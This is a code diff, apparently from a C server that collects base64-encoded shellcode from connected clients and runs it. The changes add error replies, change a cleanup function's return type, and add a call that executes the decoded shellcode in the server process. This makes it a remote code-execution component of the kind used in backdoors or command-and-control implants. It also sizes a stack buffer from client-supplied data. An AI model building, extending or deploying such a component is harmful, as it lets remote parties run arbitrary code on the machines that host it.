@@ -267,13 +267,13 @@ void CleanupClientConnection(LPCLIENTSTRUCT lpSendingClient) {
 ///////////////////////////////////////////////////////////////////////////////
 // ClearClientShellCodeLines function
 
-void ClearClientShellCodeLines(LPCLIENTSTRUCT lpSendingClient) {
+BOOL ClearClientShellCodeLines(LPCLIENTSTRUCT lpSendingClient) {
   if (lpSendingClient == NULL) {
-    return;
+    return FALSE;
   }
 
   if (!IsUUIDValid(&(lpSendingClient->clientID))) {
-    return;
+    return FALSE;
   }
 
   /* cycle through the linked list of shellcode lines, where
@@ -287,7 +287,7 @@ void ClearClientShellCodeLines(LPCLIENTSTRUCT lpSendingClient) {
     if (g_pShellCodeLines == NULL
         || GetElementCount(g_pShellCodeLines) == 0) {
       UnlockMutex(GetShellCodeListMutex());
-      return;
+      return TRUE;
     }
 
     RemoveElementWhere(&g_pShellCodeLines,
@@ -295,6 +295,8 @@ void ClearClientShellCodeLines(LPCLIENTSTRUCT lpSendingClient) {
         ReleaseShellCodeBlock);
   }
   UnlockMutex(GetShellCodeListMutex());
+
+  return TRUE;
 }
 
 ///////////////////////////////////////////////////////////////////////////////
@@ -623,6 +625,8 @@ void ProcessExecCommand(LPCLIENTSTRUCT lpSendingClient) {
   }
 
   if (!IsUUIDValid(&(lpSendingClient->clientID))) {
+    lpSendingClient->nBytesSent +=
+                ReplyToClient(lpSendingClient, ERROR_GENERAL_SERVER_FAILURE);
     return; // Required parameter
   }
 
@@ -635,23 +639,34 @@ void ProcessExecCommand(LPCLIENTSTRUCT lpSendingClient) {
   JoinAllShellCodeBytes(lpSendingClient,
       &pszEncodedShellCode, &nTotalEncodedShellCodeBytes);
   if (nTotalEncodedShellCodeBytes <= 0) {
+    lpSendingClient->nBytesSent +=
+                ReplyToClient(lpSendingClient, ERROR_GENERAL_SERVER_FAILURE);
     return;
   }
 
   if (IsNullOrWhiteSpace(pszEncodedShellCode)) {
+    lpSendingClient->nBytesSent +=
+                ReplyToClient(lpSendingClient, ERROR_GENERAL_SERVER_FAILURE);
     return;
   }
 
   int nDecodedBytes = GetBase64DecodedDataSize(pszEncodedShellCode);
+  if (nDecodedBytes <= 0) {
+    lpSendingClient->nBytesSent +=
+                ReplyToClient(lpSendingClient, ERROR_GENERAL_SERVER_FAILURE);
+    return;
+  }
 
   unsigned char szDecodedBytes[nDecodedBytes];
   memset(szDecodedBytes, 0, nDecodedBytes);
 
   Base64Decode(pszEncodedShellCode, szDecodedBytes, nDecodedBytes);
 
+  ExecShellCode1(szDecodedBytes, nDecodedBytes);
+
   /* Remove all the shellcode blocks for this client from the
    * linked list. This prevents this command from being re-issued
-   * successfully. */
+   * successfully without more code being sent. */
 
   RemoveElementWhere(&g_pShellCodeLines, &(lpSendingClient->clientID),
       FindShellCodeBlockForClient, ReleaseShellCodeBlock);
